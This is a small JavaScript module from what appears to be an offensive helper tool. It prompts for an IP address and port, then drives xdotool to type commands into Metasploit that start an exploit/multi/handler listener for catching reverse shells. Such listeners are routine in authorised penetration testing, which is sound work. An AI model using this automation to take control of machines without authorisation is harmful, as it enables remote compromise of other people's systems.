exports.openConsole = (exec, inquirer) => {
  const enterKey = "xdotool key KP_Enter";

  inquirer
    .prompt([
      {
        type: "input",
        message: "Enter you ip address again",
        name: "ip",
      },
      {
        type: "input",
        message: "Enter you desired port again",
        name: "port",
        default: 3333,
      },
    ])
    .then((answer) => {
      const command =
        `xdotool type msfconsole && ` +
        `${enterKey}  && ` +
        `xdotool type "use exploit/multi/handler" && ` +
        `${enterKey}  && ` +
        `xdotool type "set LHOST ${answer.ip}" && ` +
        `${enterKey}  && ` +
        `xdotool type "set LPORT ${answer.port}" && ` +
        `${enterKey} && ` +
        `xdotool type "exploit" && ` +
        `${enterKey}`;

      exec(command, (error, stdout, stderr) => {
        console.log(stderr);
        console.log(stdout);
        if (error !== null) {
          console.log(error);
        }
      });
    });
};
